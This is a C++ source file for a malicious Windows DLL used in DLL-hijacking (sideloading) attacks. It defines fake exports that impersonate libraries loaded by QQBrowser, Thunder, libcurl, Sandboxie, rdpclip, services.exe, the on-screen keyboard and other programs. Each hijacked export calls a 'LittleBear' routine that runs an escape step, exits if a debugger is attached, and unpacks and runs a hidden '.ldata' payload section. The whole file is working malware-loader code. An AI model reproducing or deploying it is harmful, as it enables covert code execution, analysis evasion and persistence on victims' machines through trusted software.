

#ifdef _WINDLL

#include <windows.h>
#include <iostream>
#include "dbghelp.h"
#include "DllExport.h"
#include "api.h"
#include "Debug.h"
#include "main.h"
#include "Section.h"
#include "escape.h"

#pragma comment(lib,"dbghelp.lib")

using namespace std;


int LittleBear() {

	int ret = 0;
	ret = Escape::escape();

	ret = getapi();

#ifndef _DEBUG
	if (Debug::PEB_BegingDebugged())
	{
		return FALSE;
	}
#endif

	char secname[] = { '.','l','d','a','t','a',0 };

	ret = Section::unshellSection((DWORD)ghThisHandle, secname);
	return 0;
}

//dsktptst.dll
extern "C" __declspec(dllexport) void *__stdcall SetCommandLine(void *Src) {
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __stdcall ShowMessage(int a1) {
	LittleBear();

	//该函数有64个参数难以重写，必须退出才能保证不发生异常
	//ExitProcess(0);
	return 0;
}


#ifdef DLLHIJACK_QQBROWSER
int qqDllFunLoad(string funname,int param) {

	LittleBear();

// 	char szcurfn[MAX_PATH] = { 0 };
// 	int ret = GetModuleFileNameA(lpThisDll, szcurfn, MAX_PATH);
// 	string newfilename = string(szcurfn) + "_old.dll";
// 
// 	HMODULE h = LoadLibraryA(newfilename.c_str());
// 	if (h > 0)
// 	{
// 		if (param)
// 		{
// 			typedef int(*ptrGMBSImpl)(int a1);
// 			ptrGMBSImpl lpGMBSImpl = (ptrGMBSImpl)GetProcAddress(h, funname.c_str());
// 			return lpGMBSImpl(param);
// 		}
// 		else {
// 			typedef int(*ptrGMBSImpl)();
// 			ptrGMBSImpl lpGMBSImpl = (ptrGMBSImpl)GetProcAddress(h, funname.c_str());
// 			return lpGMBSImpl();
// 		}
// 	}

	return 0;
}

extern "C" __declspec(dllexport) int __cdecl GMBSImpl(int a1)
{
	return qqDllFunLoad("GMBSImpl", a1);
	//MessageBoxA(0, "GMBSImpl", "GMBSImpl", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) int __cdecl GetMiniBrowserServer(int a1)
{
	return qqDllFunLoad("GetMiniBrowserServer", a1);
	//MessageBoxA(0, "GetMiniBrowserServer", "GetMiniBrowserServer", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) signed int Register()
{
	return qqDllFunLoad("Register", 0);
	//MessageBoxA(0, "Register", "Register", MB_OK);
	//return 0;
}

#endif



#ifdef DLLHIJACK_FIRSTLOAD
extern "C" __declspec(dllexport) int __stdcall Launch(char * a1) {
	//MessageBoxA(0, "Launch", "Launch", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __stdcall LaunchW(wchar_t * a1) {
	//MessageBoxA(0, "LaunchW", "LaunchW", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2(char * a1) {
	//MessageBoxA(0, "Launch2", "Launch2", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2W(wchar_t * a1) {
	//MessageBoxA(0, "Launch2W", "Launch2W", MB_OK);
	LittleBear();
	return 0;
}
#endif

#ifdef THUNDER_EXPORT
// extern "C" __declspec(dllexport) int __stdcall TSEGetModule(int *a1){
// 	MainProc();
// 	return 0;
// }
// extern "C" __declspec(dllexport) int __stdcall TSEGetModuleEx(int *a1){
// 	MainProc();
// 	return 0;
// }

extern "C" __declspec(dllexport) int __stdcall ThunderModule_Init(int a1) {
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) void ThunderModule_Uninit() {
	LittleBear();
	return;
}
#endif

#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) void *__stdcall liburl_1(int a1) {
	//MessageBoxA(0, "liburl_1", "liburl_1", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) signed int __stdcall TSEGetModule(int *a1) {
	//MessageBoxA(0, "TSEGetModule", "TSEGetModule", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) signed int __stdcall TSEGetModuleEx(int *a1) {
	//MessageBoxA(0, "TSEGetModuleEx", "TSEGetModuleEx", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl mini_unzip_dll(int a1, int a2) {
	//MessageBoxA(0, "mini_unzip_dll", "mini_unzip_dll", MB_OK);
	LittleBear();
	return 0;
}
#endif

#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) int __cdecl curl_easy_cleanup(int a1)
{
	//MessageBoxA(0, "curl_easy_cleanup", "curl_easy_cleanup", 0);
	return 0;
}

//用VS2005反汇编 固定参数时是callee管理的
//extern "C" __declspec(dllexport) int __thiscall curl_easy_init(void *a1)
//extern "C" __declspec(dllexport) int __stdcall curl_easy_init(void *a1)
extern "C" __declspec(dllexport) int __cdecl curl_easy_init()
{
	LittleBear();
	//MessageBoxA(0, "curl_easy_init", "curl_easy_init", 0);
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl curl_easy_perform(int a1)
{
	//MessageBoxA(0, "curl_easy_perform", "curl_easy_perform", 0);
	return 0;
}

extern "C" __declspec(dllexport) signed int __cdecl curl_easy_setopt(int a1, int a2, char a3)
{
	//MessageBoxA(0, "curl_easy_setopt", "curl_easy_setopt", 0);
	return 0;
}
#endif


#ifdef DLLHIJACK_SBIEDLL
extern "C" __declspec(dllexport) signed int SbieApi_Log()
{
	//MessageBoxA(0,"SbieApi_Log","SbieApi_Log",0);
	LittleBear();
	return TRUE;
}

extern "C" __declspec(dllexport) void __stdcall  SbieDll_Hook(int a1, int a2, int a3)
{
	//MessageBoxA(0,"SbieDll_Hook","SbieDll_Hook",0);
	LittleBear();
	return;
}
#endif


#ifdef DLLHIJACK_GETCURRENTROLLBACK
extern "C" __declspec(dllexport) void  GetCurrentInternal_ReportRollbackEvent()
{
	//MessageBoxA(0,"GetCurrentInternal_ReportRollbackEvent","GetCurrentInternal_ReportRollbackEvent",0);
	LittleBear();
	return;
}
int SetClientVerdict()
{
	MessageBoxA(0,"SetClientVerdict","SetClientVerdict",0);
	LittleBear();
	return  TRUE;
}
#endif

//clover with clover_dll.dll
#ifdef DLLHIJACK_CLOVER
extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain(void)
{
	//MessageBoxA(0,"CloverMain","CloverMain",0);
	LittleBear();
	return  TRUE;
}
#endif


#ifdef DLLHIJACK_QQMGRDIARY
extern "C" __declspec(dllexport) DWORD  __cdecl DestroyQMNetworkMgr(void)
{
	//MessageBoxA(0,"DestroyQMNetworkMgr","DestroyQMNetworkMgr",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) void __cdecl CreateQMNetworkMgr(DWORD a1)
{
	//MessageBoxA(0,"CreateQMNetworkMgr","CreateQMNetworkMgr",MB_OK);
	LittleBear();
	return ;
}
#endif


#ifdef DLLHIJACK_GOOGLESERVICE
extern "C" __declspec(dllexport) int  GoogleServices_1(int a1, int a2, int a3, int a4)
{
	LittleBear();
	//MessageBoxA(0,"GoogleServices_1","GoogleServices_1",0);
	return 0;
}
#endif

#ifdef DLLHIJACK_MSOOBE
//all is used in wdscore.dll
extern "C" __declspec(dllexport) VOID * CurrentIP()
{
	return 0;
	//MessageBoxA(0,"CurrentIP","CurrentIP",MB_OK);
}
extern "C" __declspec(dllexport) DWORD   ConstructPartialMsgVA(DWORD a1,char * a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVA","ConstructPartialMsgVA",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char* ConstructPartialMsgVW(DWORD a1,DWORD a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVW","ConstructPartialMsgVW",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogDestroy()
{
	//MessageBoxA(0,"WdsSetupLogDestroy","WdsSetupLogDestroy",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char *  WdsSetupLogInit(DWORD a1,DWORD a2,wchar_t * a3)
{
	//MessageBoxA(0,"WdsSetupLogInit","WdsSetupLogInit",MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageA()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageA","WdsSetupLogMessageA",MB_OK);
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageW()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageW","WdsSetupLogMessageW",MB_OK);
}
#endif



#ifdef DLLHIJACK_REKEYWIZ
//rekeywiz.exe //slc.dll
extern "C" __declspec(dllexport) DWORD __cdecl SLGetWindowsInformationDWORD(short * pwstr,DWORD a1)
{
	//MessageBoxA(0,"SLGetWindowsInformationDWORD","SLGetWindowsInformationDWORD",MB_OK);
	LittleBear();
	return TRUE;
}
#endif 



#ifdef DLLHIJACK_91ASSISTUPDATE
extern "C" __declspec(dllexport) void __cdecl initDll(void *a1, int a2, void *a3, void *a4, int a5)
{
	//MessageBoxA(0,"initDll","initDll",0);
	LittleBear();
}
extern "C" __declspec(dllexport) char __cdecl StartDownload(int a1)
{
	//MessageBoxA(0,"StartDownload","StartDownload",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) char __cdecl GetLocalFileName(int a1, int a2)
{
	//MessageBoxA(0,"GetLocalFileName","GetLocalFileName",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __cdecl CreateTask(LPCWSTR lpszUrl, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
	//MessageBoxA(0,"CreateTask","CreateTask",0);
	LittleBear();
	return 0;
}
#endif


#ifdef DLLHIJACK_XBROWSER
int __stdcall XL_EnableReportAutoRestartApp(int a1, int a2)
{
	MessageBoxA(0,"XL_EnableReportAutoRestartApp","XL_EnableReportAutoRestartApp",0);
	return 0;
}
int __stdcall XL_InitBugHandler(int a1, int a2, int a3, int a4, int a5)
{
	MessageBoxA(0,"XL_InitBugHandler","XL_InitBugHandler",0);
	return 0;
}
int __stdcall XL_SetAlwaysSendReport(int a1)
{
	MessageBoxA(0,"XL_SetAlwaysSendReport","XL_SetAlwaysSendReport",0);
	return 0;
}
int __stdcall XL_SetBugReportRootDir(wchar_t *a1)
{
	LittleBear();
	MessageBoxA(0,"XL_SetBugReportRootDir","XL_SetBugReportRootDir",0);
	return 0;
}
int __stdcall XL_SetReportShowMode(int a1)
{
	MessageBoxA(0,"XL_SetReportShowMode","XL_SetReportShowMode",0);
	return 0;
}
#endif





//services.exe
#ifdef DLLHIJACK_UMPNPMGR
int  DeleteServicePlugPlayRegKeys(PCWSTR SourceString)
{
	MessageBoxA(0,"PNP_GetDeviceList","PNP_GetDeviceList",0);
	return 0;
}
int  PNP_GetDeviceList(int a1, PCWSTR SourceString, int a3, int a4, int a5)
{
	MessageBoxA(0,"PNP_GetDeviceList","PNP_GetDeviceList",0);
	return 0;
}
int  PNP_GetDeviceListSize(int a1, PCWSTR SourceString, int a3, int a4)
{
	//MessageBoxA(0,"PNP_GetDeviceListSize","PNP_GetDeviceListSize",0);
	LittleBear();
	
	return 0;
}
void  PNP_GetDeviceRegProp(int a1, LPCWSTR lpSubKey, int a3, LPDWORD lpType, LPBYTE lpData, int a6, LPDWORD lpcbData, int a8)
{
	MessageBoxA(0,"PNP_GetDeviceRegProp","PNP_GetDeviceRegProp",0);
	//return 0;
}
int  PNP_HwProfFlags(RPC_BINDING_HANDLE BindingHandle, REGSAM samDesired, /*STRSAFE_PCNZWCH*/DWORD* psz, int a4, LPBYTE lpData, int a6, int a7, int a8, int a9)
{
	MessageBoxA(0,"PNP_HwProfFlags","PNP_HwProfFlags",0);
	return 0;
}
int  PNP_SetActiveService(int a1, PCWSTR SourceString, int a3)
{
	MessageBoxA(0,"PNP_SetActiveService","PNP_SetActiveService",0);
	return 0;
}
int  RegisterScmCallback(int a1, int a2)
{
	MessageBoxA(0,"RegisterScmCallback","RegisterScmCallback",0);
	return 0;
}
int  RegisterServiceNotification(int a1, /*STRSAFE_PCNZWCH*/DWORD* psz, int a3, int a4)
{
	MessageBoxA(0,"RegisterServiceNotification","RegisterServiceNotification",0);
	return 0;
}
int  ServiceEntry(int a1, int a2, int a3, DWORD ThreadId)
{
	MessageBoxA(0,"ServiceEntry","ServiceEntry",0);
	return 0;
}
#endif



//rdpclip.exe
#ifdef DLLHIJACK_RDPCLIP
char  WinStationConnectCallback(LONG a1, int a2, int a3, int a4, int a5)
{
	//MessageBoxA(0,"WinStationConnectCallback","WinStationConnectCallback",MB_OK);
	LittleBear();
	
	return 0;
}
int  WinStationVirtualOpen(volatile LONG a1, int a2, const char *a3)
{
	//MessageBoxA(0,"WinStationVirtualOpen","WinStationVirtualOpen",MB_OK);
	LittleBear();
	
	return 0;
}
char  WinStationQueryInformationW(volatile LONG a1, int a2, int a3, void *a4, int a5, int *a6)
{
	//MessageBoxA(0,"WinStationQueryInformationW","WinStationQueryInformationW",MB_OK);
	LittleBear();
	
	return 0;
}
#endif


//maganify.exe in windows xp with dll mag_hook.dll
#ifdef DLLHIJACK_MAGNIFY
DWORD  __stdcall GetPopupInfo(DWORD a1)
{
	MessageBoxA(0,"GetPopupInfo","GetPopupInfo",0);
	lpSleep(0xffffffff);
	//LittleBear();
	return 0;
}
int __stdcall InstallEventHook(HWND a1)
{
	MessageBoxA(0,"InstallEventHook","InstallEventHook",0);
	lpSleep(0xffffffff);
	//LittleBear();
	return 0;
}
int __stdcall SetZoomRect(LONG a1, int a2)
{
	//MessageBoxA(0,"SetZoomRect","SetZoomRect",0);
	LittleBear();
	return 0;
}
int __stdcall GetCursorHack()
{
	MessageBoxA(0,"GetCursorHack","GetCursorHack",0);
	lpSleep(0xffffffff);
	//LittleBear();
	return 0;
}
void __stdcall FakeCursorMove(unsigned __int16 a1, unsigned __int16 a2)
{
	MessageBoxA(0,"FakeCursorMove","FakeCursorMove",0);
	lpSleep(0xffffffff);
	//LittleBear();
	return ;
}
#endif




//freecell.exe in windows xp with cards.dll
#ifdef DLLHIJACK_FREECELL
DWORD WEP(DWORD a1)
{
	MessageBoxA(0,"wep","wep",0);
	//lpSleep(0xffffffff);
	return 0;
}
signed int cdtAnimate(int a1, int a2, int a3, int a4, int a5)
{
	MessageBoxA(0,"cdtAnimate","cdtAnimate",0);
	//lpSleep(0xffffffff);
	return 0;
}
int cdtDraw(HDC hdc, int x, HGDIOBJ h, int a4, int a5, COLORREF color)
{
	MessageBoxA(0,"cdtDraw","cdtDraw",0);
	//lpSleep(0xffffffff);
	return 0;
}
int cdtDrawExt(HDC hdc, int x, HGDIOBJ h, int w, int hDest, int a6, int a7, COLORREF color)
{
	MessageBoxA(0,"cdtDrawExt","cdtDrawExt",0);
	LittleBear();
	//lpSleep(0xffffffff);
	return 0;
}
signed int cdtInit(DWORD *a1, DWORD *a2)
{
	MessageBoxA(0,"cdtInit","cdtInit",0);
	LittleBear();
	return 0;
}
int  cdtTerm()
{
	MessageBoxA(0,"cdtTerm","cdtTerm",0);
	//lpSleep(0xffffffff);
	return 0;
}
#endif


#ifdef DLLHIJACK_OSK
//osk
//1 must be osk or else uac
//not suitable cause show osk
DWORD MSSWCH_8(DWORD a1)
{
	//MessageBoxA(0,"MSSWCH_8","MSSWCH_8",MB_OK);
	LittleBear();
	return 0;
}
#endif



#endif



